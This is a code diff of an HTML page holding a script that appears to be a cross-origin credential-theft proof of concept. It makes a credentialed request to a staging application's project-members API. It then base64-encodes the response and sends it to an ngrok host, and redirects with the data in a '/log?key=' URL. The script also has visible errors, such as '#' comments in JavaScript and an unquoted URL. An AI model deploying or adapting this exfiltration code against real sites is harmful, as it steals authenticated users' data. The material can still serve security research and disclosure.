@@ -2,32 +2,32 @@
   <body>
     <script>
 
-    #Initialize the XMLHttpRequest object, and the application URL vairable 
         var req = new XMLHttpRequest();
         var url = https://app.supersidestaging.com;
 
-    #MLHttpRequest object loads, exectutes reqListener() function
-      req.onload = retrieveKeys;
+        req.onload = retrieveKeys;
 
-    #Make GET request to the application accounDetails location
+  
         req.open('GET', url + "/api/projects/v2/193503/members",true);
     
-    #Allow passing credentials with the requests
     req.withCredentials = true;
     req.setRequestHeader("User-Agent","alwi");
  ##   req.setRequestHeader('Content-Type','application/json')
     #Send the request 
         req.send(null);
 
-    function retrieveKeys() {
-            var req2 = new XMLHttpRequest()
-            req2.setRequestHeader("User-Agent", "QuxXS")
-            req2.open("GET", "https://4778-103-83-159-18.ngrok-free.app" + btoa(this.responseText),true);
-            req.send()
+        function retrieveKeys() {
+            callIt(this.responseText)
             location='/log?key='+this.responseText;
         };
-
-      
+   
+      async function callIt(a){
+            var data = a;
+            var req2 = new XMLHttpRequest()
+            req2.setRequestHeader("User-Agent", "QuxXS")
+            await req2.open("GET", "https://4778-103-83-159-18.ngrok-free.app" + btoa(data),true);
+            req.send()
+      }
   </script>
   <body>
   </html>
